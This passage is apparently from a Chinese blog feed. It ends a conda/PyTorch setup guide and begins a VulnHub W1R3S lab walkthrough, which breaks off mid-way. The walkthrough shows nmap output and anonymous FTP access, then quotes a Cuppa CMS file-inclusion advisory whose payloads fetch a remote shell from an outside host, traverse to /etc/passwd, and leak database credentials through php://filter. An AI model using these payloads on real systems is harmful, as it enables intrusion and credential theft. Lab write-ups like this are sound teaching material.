class="code"><pre><code class="hljs plain">deactivate<br></code></pre></td></tr></table></figure><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>查看所有环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda env list<br></code></pre></td></tr></table></figure><p>复制环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda create --name myclone --clone myenv<br></code></pre></td></tr></table></figure><p>删除环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda env remove --name myenv<br></code></pre></td></tr></table></figure><h4 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h4><p>搜索包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda search package_name<br></code></pre></td></tr></table></figure><p>安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda install package_name<br></code></pre></td></tr></table></figure><p>安装包的时候指定镜像源</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">conda install package_name -c <br></code></pre></td></tr></table></figure><p>安装指定版本的包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda install package_name=1.2.1<br></code></pre></td></tr></table></figure><p>更新包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda update package_name<br></code></pre></td></tr></table></figure><p>清理包（代码清理 conda 缓存，删除不再需要的软件包。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda clean --all<br></code></pre></td></tr></table></figure><p>卸载包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda remove package_name<br></code></pre></td></tr></table></figure><p>查看已安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda list  [选填，可以输入包名]<br></code></pre></td></tr></table></figure><h4 id="运行-python-程序"><a href="#运行-python-程序" class="headerlink" title="运行 python 程序"></a>运行 python 程序</h4><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/3.png"></p><h2 id="项目配置（第一个版本）"><a href="#项目配置（第一个版本）" class="headerlink" title="项目配置（第一个版本）"></a>项目配置（第一个版本）</h2><p>1.手动创建 anaconda 环境（test），配置并激活</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/4.png"></p><p>配置 anaconda 环境，例如 python 版本，需要用到的 python 库文件，包文件</p><p>2.pycharm 环境配置</p><p>新建项目：</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/5.png"></p><p>配置 python 解释器：</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/6.png"></p><p>pycharm 中的包与 anaconda 中的一致</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/7.png"></p><p>3.运行项目</p><p>运行项目之后各种找不到包，就在 conda 中 search、install 就可以。</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/8.png"></p><h2 id="项目配置（第二个版本）"><a href="#项目配置（第二个版本）" class="headerlink" title="项目配置（第二个版本）"></a>项目配置（第二个版本）</h2><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/9.png"></p><p>点击加载环境之后即可选择之前创建好的环境</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/10.png"></p><h2 id="CUDA"><a href="#CUDA" class="headerlink" title="CUDA"></a>CUDA</h2><h4 id="CUDA-版本确认"><a href="#CUDA-版本确认" class="headerlink" title="CUDA 版本确认"></a>CUDA 版本确认</h4><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/11.png"></p><p>**显卡型号：**NVIDIA GeForce RTX 4060 Laptop GPU</p><pre><code class="hljs">驱动程序版本:32.0.15.6607驱动程序日期:2024/10/20DirectX 版本:12 (FL 12.1)物理位置：PCI 总线 1、设备 0、功能 0</code></pre><p><strong>确定显卡算力：</strong></p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/12.png"></p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/13.png"></p><p>我的电脑支持的 11.8-12.9</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">#https://pytorch.org/get-started/previous-versions/<br>conda install pytorch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 pytorch-cuda=12.4 -c pytorch -c nvidia<br></code></pre></td></tr></table></figure><p>要求 python 版本必须大于 3.10</p><h4 id="安装-Pytorch"><a href="#安装-Pytorch" class="headerlink" title="安装 Pytorch"></a>安装 Pytorch</h4><p>主要就是安装三个包 pytorch 、torchvision（图像）、torchaudio（声音）</p><p>使用清华源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda install pytorch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 pytorch-cuda=12.4 -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ -c nvidia<br></code></pre></td></tr></table></figure><p>下载完之后，验证</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/14.png"></p><p>OJ*K，pytorch 安装好之后，就可以直接在 pycharm 中 import 使用了，开始你的快乐学习之旅吧~</p><h4 id="安装-Jupyter"><a href="#安装-Jupyter" class="headerlink" title="安装 Jupyter"></a>安装 Jupyter</h4><p>Jupyter 随着 anaconda 一起安装，但是仅默认安装到 anaconda 的 base 环境中，所以但凡是自己新建的 conda 环境，都需要重新安装 Jupyter。</p><p>安装 Jupyter 依赖的包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda install ipython<br><br><br></code></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">jupyter notebook<br></code></pre></td></tr></table></figure><h2 id="运行别人项目"><a href="#运行别人项目" class="headerlink" title="运行别人项目"></a>运行别人项目</h2><p>参考：<a href="https://www.bilibili.com/video/BV1S5411X7FY?spm_id_from=333.788.videopod.episodes&vd_source=4e9106e7030f1c25677827558da5c605&p=30">https://www.bilibili.com/video/BV1S5411X7FY?spm_id_from&#x3D;333.788.videopod.episodes&amp;vd_source&#x3D;4e9106e7030f1c25677827558da5c605&amp;p&#x3D;30</a></p><p>1.给项目配置 anaconda 环境， python 解释器配置（参考项目配置）</p><ol start="2"><li>缺包添加包</li></ol><ul><li>conda install 包名</li><li>pip install 包名（requirements.txt）  需要在项目根目录下运行该命令！！</li></ul><p>3.开始使用项目</p>]]></content>
    
    
    <categories>
      
      <category>conda</category>
      
    </categories>
    
    
    <tags>
      
      <tag>conda</tag>
      
      <tag>anaconda</tag>
      
      <tag>pytorch</tag>
      
      <tag>Jupyter</tag>
      
      <tag>AI</tag>
      
      <tag>深度学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-w1r3s</title>
    <link href="/2025/06/30/vulnhub-w1r3s/"/>
    <url>/2025/06/30/vulnhub-w1r3s/</url>
    
    <content type="html"><![CDATA[<p>要细心，沉心地做信息搜集、资产测绘<br>靶机 ip：192.168.17.145</p><h1 id="Qj6sX">端口扫描</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/Desktop]<br>└─$ sudo nmap -sS -sV -T5 -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-comment">//nmap.org ) at 2025-06-30 03:10 EDT</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br>Host is <span class="hljs-title function_ invoke__">up</span> (<span class="hljs-number">0.00088</span>s latency).<br>Not shown: <span class="hljs-number">55528</span> filtered tcp <span class="hljs-title function_ invoke__">ports</span> (no-response), <span class="hljs-number">10003</span> closed tcp <span class="hljs-title function_ invoke__">ports</span> (reset)<br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp   open  ftp     vsftpd <span class="hljs-number">2.0</span>.<span class="hljs-number">8</span> <span class="hljs-keyword">or</span> later<br>| ftp-anon: Anonymous FTP login <span class="hljs-title function_ invoke__">allowed</span> (FTP code <span class="hljs-number">230</span>)<br>| drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> content<br>| drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> docs<br>|_drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">28</span>  <span class="hljs-number">2018</span> <span class="hljs-keyword">new</span>-employees<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::<span class="hljs-variable constant_">ffff</span>:<span class="hljs-number">192.168</span>.<span class="hljs-number">17.136</span><br>|      Logged in <span class="hljs-keyword">as</span> ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is <span class="hljs-number">300</span><br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was <span class="hljs-number">4</span><br>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable<br>|_End of status<br><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">07</span>:e3:<span class="hljs-number">5</span>a:<span class="hljs-number">5</span>c:c8:<span class="hljs-number">18</span>:<span class="hljs-number">65</span>:b0:<span class="hljs-number">5</span>f:<span class="hljs-number">6</span>e:f7:<span class="hljs-number">75</span>:c7:<span class="hljs-number">7</span>e:<span class="hljs-number">11</span>:<span class="hljs-title function_ invoke__">e0</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">03</span>:ab:<span class="hljs-number">9</span>a:ed:<span class="hljs-number">0</span>c:<span class="hljs-number">9</span>b:<span class="hljs-number">32</span>:<span class="hljs-number">26</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>:ad:b0:b0:<span class="hljs-number">96</span>:c3:<span class="hljs-number">1</span>e (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span>d:<span class="hljs-number">6</span>d:d2:<span class="hljs-number">4</span>b:<span class="hljs-number">46</span>:e8:c9:a3:<span class="hljs-number">49</span>:e0:<span class="hljs-number">93</span>:<span class="hljs-number">56</span>:<span class="hljs-number">22</span>:<span class="hljs-number">2</span>e:e3:<span class="hljs-number">54</span> (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br><span class="hljs-number">3306</span>/tcp open  mysql   <span class="hljs-title function_ invoke__">MySQL</span> (unauthorized)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">7</span>F:<span class="hljs-number">87</span>:<span class="hljs-title function_ invoke__">A6</span> (VMware)<br>Aggressive OS guesses: Linux <span class="hljs-number">3.10</span> - <span class="hljs-number">4.11</span> (<span class="hljs-number">98</span>%), Linux <span class="hljs-number">5.1</span> - <span class="hljs-number">5.15</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.14</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.13</span> - <span class="hljs-number">4.4</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">4.10</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.10</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">4.4</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> - <span class="hljs-number">4.6</span> (<span class="hljs-number">92</span>%), OpenWrt <span class="hljs-number">19.07</span> (Linux <span class="hljs-number">4.14</span>) (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> - <span class="hljs-number">3.13</span> (<span class="hljs-number">91</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> <span class="hljs-title function_ invoke__">host</span> (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">1</span> hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0.88</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP <span class="hljs-title function_ invoke__">address</span> (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">43.27</span> seconds<br><br></code></pre></td></tr></table></figure><h3 id="cQiN1">端口分析</h3>21：大概率有信息泄露；ftp 也有历史漏洞可能可以利用<p>22：可行性不大，ssh 版本较高</p><p>80：优先分析。一般是网站</p><p>3306：一般是 mysql</p><h4 id="Tobc4">nmap 漏洞扫描脚本</h4><p><img src="/../img/vulnhub-w1r3s.md/1.png"></p><p>nmap 没有扫出来，说明它不行…..你得自己找别的办法！  因为你是行的！</p><h1 id="FS8dt">21 端口</h1><h3 id="pdG8h">匿名登录 FTP</h3>nmap 的扫描结果中说明可以匿名登录 ftp<p><img src="/../img/vulnhub-w1r3s.md/2.png"></p><p>将 ftp 服务器中的文件 down 到本地</p><p><img src="/../img/vulnhub-w1r3s.md/3.png"></p><p>查看</p><p><img src="/../img/vulnhub-w1r3s.md/4.png"></p><h4 id="bU1Gs">查看加密算法</h4><p><img src="/../img/vulnhub-w1r3s.md/5.png"></p><p>md5 加密</p><p>那个没识别出来的，一眼就能看出来是 base64 嘛</p><h4 id="oWr3o">base64 解密</h4><p><img src="/../img/vulnhub-w1r3s.md/6.png"></p><h1 id="s6CLV">3306 端口</h1>mysql<p><img src="/../img/vulnhub-w1r3s.md/7.png"></p><h1 id="xitSx"> 80 端口</h1><p><img src="/../img/vulnhub-w1r3s.md/8.png"></p><p>apach 的首页，working</p><h4 id="GRqcg">gobuster 目录扫描</h4><p><img src="/../img/vulnhub-w1r3s.md/9.png"></p><p>administrator 可以访问</p><h4 id="wVCRh">dirb 目录爆破</h4>对网站进行目录爆破<p>dirb <a href="http://192.168.17.145/">http://192.168.17.145</a></p><p>可以访问<a href="http://192.168.17.145/administrator/installation/">http://192.168.17.145/administrator/installation/</a></p><p><img src="/../img/vulnhub-w1r3s.md/10.png"></p><h3 id="alQnL">对 wordprass 进行测试</h3>先测试页面的有哪些功能<p><img src="/../img/vulnhub-w1r3s.md/11.png"></p><p><img src="/../img/vulnhub-w1r3s.md/12.png"></p><p><strong>真实情况下，需要在网上找这个页面的独特信息。是否会造成不可逆的服务器修改？？！</strong></p><p><img src="/../img/vulnhub-w1r3s.md/13.png"></p><h2 id="W3BH8"> Cuppa CMS 渗透</h2><h4 id="IpUsC">searchsploit漏洞信息搜集</h4>kali 中有自带的 searchsploit（**exploit-db.com 的本地版本**）<p><img src="/../img/vulnhub-w1r3s.md/14.png"></p><p>漏洞信息：<a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs plain">                                                                                                                                                                  <br>┌──(kali㉿kali)-[~/VulnHub/w1r3s]<br>└─$ cat 25971.txt            <br># Exploit Title   : Cuppa CMS File Inclusion<br># Date            : 4 June 2013<br># Exploit Author  : CWH Underground<br># Site            : www.2600.in.th<br># Vendor Homepage : http://www.cuppacms.com/<br># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip  //找开源的代码可以做代码审计<br># Version         : Beta<br># Tested on       : Window and Linux<br><br>  ,--^----------,--------,-----,-------^--,<br>  | |||||||||   `--------&#x27;     |          O .. CWH Underground Hacking Team ..<br>  `+---------------------------^----------|<br>    `\_,-------, _________________________|<br>      / XXXXXX /`|     /<br>     / XXXXXX /  `\   /<br>    / XXXXXX /\______(<br>   / XXXXXX /<br>  / XXXXXX /<br> (________(<br>  `------&#x27;<br><br>####################################<br>VULNERABILITY: PHP CODE INJECTION<br>####################################<br><br>/alerts/alertConfigField.php (LINE: 22)<br><br>-----------------------------------------------------------------------------<br>LINE 22:<br>        &lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;<br>-----------------------------------------------------------------------------<br><br><br>#####################################################<br>DESCRIPTION<br>#####################################################<br><br>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.<br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]<br><br>#####################################################<br>EXPLOIT<br>#####################################################<br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br><br>Moreover, We could access Configuration.php source code via PHPStream<br><br>For Example:<br>-----------------------------------------------------------------------------<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php<br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br><br>Base64 Decode Output:<br>-----------------------------------------------------------------------------<br>&lt;?php<br>        class Configuration&#123;<br>                public $host = &quot;localhost&quot;;<br>                public $db = &quot;cuppa&quot;;<br>                public $user = &quot;root&quot;;<br>                public $password = &quot;Db@dmin&quot;;<br>                public $table_prefix = &quot;cu_&quot;;<br>                public $administrator_template = 